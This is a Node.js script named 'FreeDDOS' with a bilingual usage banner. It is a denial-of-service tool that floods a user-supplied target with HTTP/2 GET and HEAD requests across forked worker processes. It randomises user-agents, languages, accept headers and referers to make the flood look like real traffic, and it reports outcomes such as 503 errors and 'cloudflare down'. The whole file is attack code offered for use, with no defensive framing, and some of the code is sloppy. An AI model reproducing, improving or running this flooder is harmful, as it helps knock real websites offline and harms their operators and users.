const https = require("https")
const http = require("http")
const path = require("path")
const cluster = require("cluster")
const http2 = require("http2")
const name = process.argv[1]
const getname = path.basename(name)
const target = process.argv[2]
const time = process.argv[3]
const thread = process.argv[4]
if ( process.argv.length < 4 ) {
	console.log("\x1b[33m\x1b[1m──────FreeDDOS──────\x1b[0m")
	console.log("\x1b[31m\x1b[1mCách dùng / Guide use\x1b[0m")
	console.log("\x1b[33m\x1b[1mnode " + getname + " [target] [time] [thread]\x1b[0m")
	process.exit()
}
const ualist = [
	"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
        "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
        "Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
        "Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
        "Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1"
]
const lang_header = [
    "ko-KR",
    "en-US",
    "zh-CN",
    "zh-TW",
    "ja-JP",
    "en-GB",
    "en-AU",
    "en-CA",
    "en-NZ",
    "en-ZA",
    "en-IN",
    "en-PH",
    "en-SG",
    "en-HK",
    "*",
    "en-US,en;q=0.5",
    "utf-8, iso-8859-1;q=0.5, *;q=0.1",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-GB, en-US, en;q=0.9",
    "de-AT, de-DE;q=0.9, en;q=0.5",
    "cs;q=0.5",
    "da, en-gb;q=0.8, en;q=0.7",
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "tr",
]
const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*',
    'image/avif,image/webp,*/*',
    'image/webp,*/*',
    'image/png,image/*;q=0.8,*/*;q=0.5',
    'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
    'image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
    'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
    'image/png,image/svg+xml,image/*;q=0.8, */*;q=0.5',
    'text/css,*/*;q=0.1',
    'text/css',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
]
const encoding = [
    "*",
    "gzip, deflate",
    "br;q=1.0, gzip;q=0.8, *;q=0.1",
    "gzip",
    "gzip, compress",
    "compress, deflate",
    "compress",
    "gzip, deflate, br",
    "deflate",
    "gzip, deflate, lzma, sdch",
    "deflate",
]
const controle_header = [
    'max-age=604800',
    's-maxage=604800',
    'max-stale',
    'min-fresh',
    'private',
    'public',
    'no-cache',
    'no-store',
    'no-transform',
    'stale-if-error',
    'only-if-cached',
    'max-age=0',
    'must-understand, no-store',
    'public, max-age=604800, immutable',
    'max-age=604800, stale-while-revalidate=86400',
    'max-stale=3600',
    'min-fresh=600',
    'max-age=31536000, immutable',
    'max-age=604800, stale-if-error=86400',
    'public, max-age=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate'
]
const referer = [
	"https://check-host.net",
	"https://dstat.cc",
	"https://google.com",
	"https://nminh2302.site",
	"https://nasa.gov",
	"https://check-host.cc",
	"https://dstat.love",
	"https://amazon.com",
	"https://paypal.com",
]
function lang() {
	return lang_header[Math.floor(Math.random()* lang_header.length)]
}
function ua() {
	return ualist[Math.floor(Math.random()* ualist.length)]
}
function encoding2() {
	return encoding[Math.floor(Math.random()* encoding.length)]
}
function accept() {
	return accept_header[Math.floor(Math.random()* accept_header.length)]
}
function controle() {
	return controle_header[Math.floor(Math.random()* controle_header.length)]
}
function ref() {
	return referer[Math.floor(Math.random()* referer.length)]
}
const agent = new http.Agent({
	KeepAlive: true,
	KeepAliveMsecs: time,
	maxTotalSockets: Infinity,
	maxSockets: Infinity
})
console.log("Attack!")
function flood_get() {
	const options = {
		hostname: target,
		path: "/",
		globalAgent: agent,
		method: "GET",
		timeout: 5000,
		initialWindowSize: 1073741823,
		maxConcurrentStreams: 1000,
		maxHeaderListSize: 262144,
		maxSessionMemory: 4444,
		maxDeflateDynamicTableSize: 4294967295,
		enablePush: false,
		headerTableSize: 65536,
		header: {
			"accept": accept(),
			"accept-language": lang(),
			"user-agent": ua(),
			"accept-encoding": encoding2(),
			"referer": ref(),
			"cache-control": controle,
			"orgin": target,
		}
	} 
	const client = http2.connect(target)
	const req = client.request(options)
	req.on("response", (response) => {
		if ( req.statusCode === "Just a moment..." ) {
			console.log("\x1b[32m\x1b[1mStatus:Just a moment...\x1b[0m")
		}
		if ( req.statusCode === 502 ) {
			console.log("\x1b[32m\x1b[1mStatus:502 bad gateway\x1b[0m")
		}
		if ( req.statusCode === 503 ) {
			console.log("\x1b[32m\x1b[1mStatus:503 Service Unavailable\x1b[0m")
		}
		if ( req.statusCode === 429 ) {
			console.log("\x1b[32m\x1b[1mStatus:429 too many requests\x1b[0m")
		}
		if ( req.statusCode === 404 ) {
			console.log("\x1b[32m\x1b[1mStatus:404 not found\x1b[0m")
		}
		if ( req.statusCode === 403 ) {
			console.log("\x1b[32m\x1b[1mStatus: 403 Forbidden\x1b[0m")
		}
		if ( req.statusCode === 522 ) {
			console.log("\x1b[32m\x1b[1mStatus: 522 cloudflare down\x1b[0m")
		}
		if ( req.statusCode === 525 ) {
			console.log("\x1b[32m\x1b[1mStatus: 525 cloudflare down\x1b[0m")
		}
		req.end()
		req.destroy()
		return
	})
	req.on("error", () => {
		console.log("\x1b[31m\x1b[1mError ☠\x1b[0m")
		req.destroy()
		return
	})
}
function flood_head() {
	const options = {
		hostname: target,
		path: "/",
		globalAgent: agent,
		method: "HEAD",
		timeout: 5000,
		initialWindowSize: 1073741823,
		maxConcurrentStreams: 1000,
		maxHeaderListSize: 262144,
		maxSessionMemory: 4444,
		maxDeflateDynamicTableSize: 4294967295,
		enablePush: false,
		headerTableSize: 65536,
		header: {
			"accept": accept(),
			"accept-language": lang(),
			"user-agent": ua(),
			"accept-encoding": encoding2(),
			"referer": ref(),
			"cache-control": controle,
			"orgin": target,
		}
	}
	const client = http2.connect(target)
	const req = client.request(options)
	req.on("response", (response) => {
		if ( req.statusCode === "Just a moment..." ) {
			console.log("\x1b[32m\x1b[1mStatus:Just a moment...\x1b[0m")
		}
		if ( req.statusCode === 502 ) {
			console.log("\x1b[32m\x1b[1mStatus:502 bad gateway\x1b[0m")
		}
		if ( req.statusCode === 503 ) {
			console.log("\x1b[32m\x1b[1mStatus:503 Service Unavailable\x1b[0m")
		}
		if ( req.statusCode === 429 ) {
			console.log("\x1b[32m\x1b[1mStatus:429 too many requests\x1b[0m")
		}
		if ( req.statusCode === 404 ) {
			console.log("\x1b[32m\x1b[1mStatus:404 not found\x1b[0m")
		}
		if ( req.statusCode === 403 ) {
			console.log("\x1b[32m\x1b[1mStatus: 403 Forbidden\x1b[0m")
		}
		if ( req.statusCode === 522 ) {
			console.log("\x1b[32m\x1b[1mStatus: 522 cloudflare down\x1b[0m")
		}
		if ( req.statusCode === 525 ) {
			console.log("\x1b[32m\x1b[1mStatus: 525 cloudflare down\x1b[0m")
		}
		req.end()
		req.destroy()
		return
	})
	req.on("error", () => {
		console.log("\x1b[31m\x1b[1mError ☠\x1b[0m")
		req.destroy()
		return
	})
}
if ( cluster.isWorker ) {
	setInterval(() => {
		flood_get()
		flood_head()
	})
} else {
	setInterval(() => {
		flood_get()
		flood_head()
	})
	for (let i = 0;i < thread;i ++) {
		cluster.fork()
	}
}
setTimeout(() => {
	process.exit()
}, time * 1000)
